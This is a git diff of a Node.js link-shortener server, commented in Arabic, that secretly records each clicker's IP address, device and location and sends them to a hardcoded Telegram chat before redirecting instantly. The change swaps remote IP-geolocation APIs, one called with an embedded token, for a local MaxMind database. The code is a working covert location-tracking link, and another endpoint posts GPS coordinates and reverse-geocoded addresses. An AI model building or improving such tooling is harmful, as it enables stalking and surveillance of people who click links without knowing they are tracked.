@@ -2,6 +2,9 @@ const express = require('express');
 const axios = require('axios');
 const crypto = require('crypto');
 const cors = require('cors');
+const Reader = require('maxmind').Reader;
+const fs = require('fs');
+const path = require('path');
 require('dotenv').config();
 
 const app = express();
@@ -15,6 +18,24 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
 const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';
 
 const linkStorage = {};
+let maxmindReader = null;
+
+// ===== تحميل MaxMind Database =====
+async function initMaxMind() {
+  try {
+    const dbPath = path.join(__dirname, 'geoip', 'GeoLite2-City.mmdb');
+    if (fs.existsSync(dbPath)) {
+      maxmindReader = await Reader.open(dbPath);
+      console.log('✅ MaxMind Database loaded successfully');
+    } else {
+      console.warn('⚠️ GeoLite2-City.mmdb not found at:', dbPath);
+    }
+  } catch (err) {
+    console.error('❌ Error loading MaxMind database:', err.message);
+  }
+}
+
+initMaxMind();
 
 function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
@@ -43,88 +64,31 @@ async function sendToTelegram(msg, retries = 3) {
   return false;
 }
 
-// ===== طرق تحديد الموقع بدقة عالية =====
-
-// Method 1: GeoJS (دقيق وسريع)
-async function getLocationFromGeoJS(ip) {
+// ===== MaxMind Location Detection =====
+function getLocationFromMaxMind(ip) {
+  if (!maxmindReader) return null;
+  
   try {
-    const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 3000 });
-    if (res.data) {
+    const response = maxmindReader.city(ip);
+    if (response && response.location) {
       return {
-        source: 'GeoJS',
-        country: res.data.country_name || 'Unknown',
-        city: res.data.city || 'Unknown',
-        latitude: res.data.latitude,
-        longitude: res.data.longitude,
-        accuracy: '±15-50km',
-        isp: res.data.organization || 'Unknown'
+        source: 'MaxMind GeoLite2',
+        country: response.country?.names?.ar || response.country?.iso_code || 'Unknown',
+        city: response.city?.names?.ar || response.city?.names?.en || 'Unknown',
+        latitude: response.location.latitude,
+        longitude: response.location.longitude,
+        accuracy: `±${response.location.accuracy_radius || 30}km`,
+        isp: response.traits?.autonomous_system_organization || 'Unknown',
+        timezone: response.location.time_zone || 'Unknown'
       };
     }
-  } catch (e) {
-    console.log('[GeoJS] Error:', e.message);
+  } catch (err) {
+    console.log('[MaxMind] Error:', err.message);
   }
   return null;
 }
 
-// Method 2: ipinfo.io (دقيق جداً)
-async function getLocationFromIPInfo(ip) {
-  try {
-    const res = await axios.get(`https://ipinfo.io/${ip}?token=9f5b1ad4e5e8e0`, { timeout: 3000 });
-    if (res.data && res.data.loc) {
-      const [lat, lng] = res.data.loc.split(',');
-      return {
-        source: 'IPInfo',
-        country: res.data.country || 'Unknown',
-        city: res.data.city || 'Unknown',
-        latitude: parseFloat(lat),
-        longitude: parseFloat(lng),
-        accuracy: '±10-30km',
-        isp: res.data.org || 'Unknown',
-        timezone: res.data.timezone || 'Unknown'
-      };
-    }
-  } catch (e) {
-    console.log('[IPInfo] Error:', e.message);
-  }
-  return null;
-}
-
-// Method 3: ip-api.com (fallback)
-async function getLocationFromIPAPI(ip) {
-  try {
-    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
-    if (res.data && res.data.status === 'success') {
-      return {
-        source: 'IP-API',
-        country: res.data.country,
-        city: res.data.city,
-        latitude: parseFloat(res.data.lat),
-        longitude: parseFloat(res.data.lon),
-        accuracy: '±50-100km',
-        isp: res.data.isp
-      };
-    }
-  } catch (e) {
-    console.log('[IP-API] Error:', e.message);
-  }
-  return null;
-}
-
-// جرّب كل الطرق وخذ الأفضل
-async function getBestLocation(ip) {
-  const geojs = await getLocationFromGeoJS(ip);
-  if (geojs) return geojs;
-
-  const ipinfo = await getLocationFromIPInfo(ip);
-  if (ipinfo) return ipinfo;
-
-  const ipapi = await getLocationFromIPAPI(ip);
-  if (ipapi) return ipapi;
-
-  return null;
-}
-
-// Reverse Geocoding (تحويل الإحداثيات لعنوان)
+// Reverse Geocoding
 async function reverseGeocode(lat, lng) {
   try {
     const res = await axios.get(
@@ -215,7 +179,7 @@ app.post('/api/log-all', async (req, res) => {
     };
   }
 
-  const ipInfo = await getBestLocation(ip);
+  const ipInfo = getLocationFromMaxMind(ip);
   let reverseInfo = null;
 
   if (gpsInfo) {
@@ -239,9 +203,9 @@ app.post('/api/log-all', async (req, res) => {
   }
 
   if (ipInfo) {
-    msg += `<b>✅ [2] 🌐 IP Location (${ipInfo.source})</b>\n🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n📏 ${ipInfo.accuracy}\n🏢 ${ipInfo.isp}\n🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
+    msg += `<b>✅ [2] 🌐 IP Location (MaxMind)</b>\n🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n📏 ${ipInfo.accuracy}\n🏢 ${ipInfo.isp}\n⏱️ ${ipInfo.timezone}\n🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
   } else {
-    msg += `<b>❌ [2] IP Location</b> - فشل جميع الطرق\n━━━━━━━━━━━━━━━━━━━\n\n`;
+    msg += `<b>❌ [2] IP Location</b> - Database غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   if (reverseInfo) {
@@ -250,7 +214,7 @@ app.post('/api/log-all', async (req, res) => {
 
   msg += `<b>✅ [4] 🖥️ Device Detection</b>\n📱 ${device.device} | ${device.os} | ${device.browser}\n━━━━━━━━━━━━━━━━━━━\n\n`;
 
-  const bestMethod = gpsInfo ? '📍 GPS' : (ipInfo ? `🌐 ${ipInfo.source}` : 'N/A');
+  const bestMethod = gpsInfo ? '📍 GPS' : (ipInfo ? '🌐 MaxMind' : 'N/A');
   msg += `<b>🎯 أفضل موقع:</b> ${bestMethod}`;
 
   await sendToTelegram(msg);
@@ -270,7 +234,7 @@ app.get('/api/stats/:code', (req, res) => {
 
 app.use(express.static('.'));
 
-// ===== REDIRECT فوري (بدون صفحة وسيطة) =====
+// ===== REDIRECT فوري =====
 app.get('/:code', async (req, res) => {
   const { code } = req.params;
 
@@ -281,11 +245,11 @@ app.get('/:code', async (req, res) => {
   const originalUrl = linkStorage[code].original;
   linkStorage[code].clicks++;
 
-  // Log في background (بدون تأخير)
+  // Log في background
   setImmediate(async () => {
     const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
     const userAgent = req.get('user-agent') || 'Unknown';
-    const ipInfo = await getBestLocation(ip);
+    const ipInfo = getLocationFromMaxMind(ip);
     const device = parseUserAgent(userAgent);
 
     let msg = `🔗 <b>رابط تم فتحه!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
@@ -296,7 +260,7 @@ app.get('/:code', async (req, res) => {
 
     if (ipInfo) {
       msg += `━━━━━━━━━━━━━━━━━━━\n`;
-      msg += `<b>✅ 📍 IP Location (${ipInfo.source})</b>\n`;
+      msg += `<b>✅ 📍 MaxMind Geolocation</b>\n`;
       msg += `🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n`;
       msg += `📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n`;
       msg += `📏 ${ipInfo.accuracy}\n`;
@@ -307,7 +271,6 @@ app.get('/:code', async (req, res) => {
     await sendToTelegram(msg);
   });
 
-  // Redirect فوري (HTTP 301)
   res.redirect(301, originalUrl);
 });
 
